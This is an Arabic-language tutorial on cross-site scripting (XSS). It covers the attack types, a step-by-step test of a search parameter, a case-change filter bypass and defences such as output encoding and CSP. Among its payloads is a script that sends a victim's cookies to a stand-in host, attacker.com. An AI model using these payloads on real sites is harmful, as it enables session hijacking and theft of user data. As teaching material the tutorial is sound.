💣 ثغرة XSS (Cross Site Scripting)

🧠 يعني إيه XSS؟

هي إدخال كود JavaScript خبيث في الموقع ليتم تنفيذه في متصفح الضحية.

👉 الهدف: سرقة Cookies • سرقة Sessions • توجيه (Redirect) المستخدم لموقع خبيث.

🔥 أنواع الـ XSS

1️⃣ Reflected XSS

بيظهر في نفس الصفحة ومش محفوظ على السيرفر (بيعتمد إن الضحية يفتح اللينك).

<script>alert(1)</script>
👉 لو الموقع رجعه في الصفحة واشتغل = XSS 🔥
2️⃣ Stored XSS 🔥 أخطر نوع

الكود بيتخزن في السيرفر أو قاعدة البيانات بشكل دائم.

  • مثال: Comment box.
  • لما أي حد يفتح الصفحة اللي فيها الكومنت → الكود يشتغل فوراً.
3️⃣ DOM-based XSS

المشكلة بتكون في كود الـ JavaScript نفسه اللي شغال عند الـ Client، وبيغير في الـ DOM من غير ما يرجع للسيرفر.

💉 أمثلة على الـ Payloads

🔹 سرقة الـ Cookie:
<script>alert(document.cookie)</script>
🔹 إرسال البيانات لسيرفر الهاكر:
<script>location='http://attacker.com?c='+document.cookie</script>

⚙️ اختبار XSS عملي خطوة بخطوة

🔍
Step 1: جرب الـ Input

دور على أي مكان بياخد مدخلات زي الـ Search box أو الـ Comments.

💉
Step 2: جرب Payload
<script>alert(1)</script>
🔥
Step 3: لو اشتغل!

لو البوب أب (Alert) ظهر، الموقع Vulnerable للـ XSS!

# مثال عملي كامل على رابط حقيقي
Target URL: http://site.com/search?q=test
# الخطوة 1: حقن البايلود في الـ Parameter
Injecting: http://site.com/search?q=<script>alert(1)</script>
# النتيجة: لو المتصفح نفذ الكود وظهر Alert 1
👉 Boom! Reflected XSS 🔥
🚫 لو فيه فلترة (Filtering Bypass)

لو كتبت <script> والموقع عملها Block ❌

✅ الحل (Bypass):

غير حالة الأحرف (Capitalize):

<SCRIPT>alert(1)</SCRIPT>
🧠 أماكن تدور فيها على XSS
  • Search Boxes
  • Login Pages
  • Comment Sections
  • URL Parameters
  • Contact Forms

🔐 حماية XSS

  • Input validation: فلترة المدخلات.
  • Output encoding: تشفير البيانات قبل عرضها في الصفحة.
  • استخدام CSP: (Content Security Policy) لمنع السكريبتات الخارجية.
